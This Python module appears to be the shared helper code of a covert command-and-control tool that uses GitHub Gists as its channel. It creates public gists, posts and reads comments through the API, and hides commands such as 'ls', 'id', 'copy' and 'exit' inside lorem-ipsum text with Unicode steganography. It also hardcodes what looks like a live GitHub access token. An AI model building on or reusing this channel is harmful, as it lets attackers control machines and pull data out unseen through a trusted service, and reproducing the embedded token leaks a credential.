import pyUnicodeSteganography as usteg
import requests

GIST_BASE_URL = "https://api.github.com/gists"

AUTH_TOKEN = "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"
AUTH_HEADER = {"Authorization": f"Bearer {AUTH_TOKEN}"}

COMMANDS = [
    "w",
    "ls",
    "id",
    "copy",
    "binary",
    "exit",
]

CMD_COVERED = {}
CMD_COVERED["w"] = "Duis convallis sagittis odio at placerat. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Etiam finibus massa lorem"
CMD_COVERED["ls"] = "Maecenas eros metus, tempus a erat sed, ornare tristique magna. Aliquam hendrerit ornare finibus. In sed dui nunc."
CMD_COVERED["id"] = " ut, molestie gravida lectus. Aliquam leo dolor, scelerisque eget nibh nec, semper rutrum massa. Maecenas rhoncus turpis vel lorem viverra s"
CMD_COVERED["copy"] = "m nibh eget diam. Nulla dictum lectus lectus, sed hendrerit quam eleifend ege"
CMD_COVERED["binary"] = "acinia erat finibus sit amet. Praesent faucibus in urna a lobortis. Curabitur gravida eget"
CMD_COVERED["exit"] = "eeee erat finibus dasadsad amet. adad faucibus in urna a bbbewqw. Curabitur gravida eget"


# Creates new gist with some description and returns gistId
def gist_create():
    res = requests.post(GIST_BASE_URL, headers=AUTH_HEADER, json={
        "description": "Example of a gist",
        "public": True,
        "files": {
            'README.md': {
                "content": 'Hello World'
            }
        }
    })
    gist_id = res.json().get("id")
    return gist_id


# Deletes gist by id
def gist_delete(gistId):
    requests.delete(GIST_BASE_URL + "/" + gistId, headers=AUTH_HEADER)


# add new comment to selected gist by gistId
def gist_add_comment(gistId, text):
    requests.post(GIST_BASE_URL + "/" + gistId + "/comments", headers=AUTH_HEADER, json={
        "body": text,
    })

# get last comment from selected gist by gistId
# return None if the comments are empty
def gist_get_last_comments(gistId):
    res = requests.get(GIST_BASE_URL + "/" + gistId + "/comments", headers=AUTH_HEADER, params={"per_page": 100}).json()

    if (len(res) < 1):
        return None

    print(res[len(res)-1]["body"])
    return res[len(res)-1]["body"]


# steganography encode message
def steg_encode(text, secret_msg):
    return usteg.encode(text, secret_msg)


# steganography decode message
def steg_decode(encoded_message):
    return usteg.decode(encoded_message)
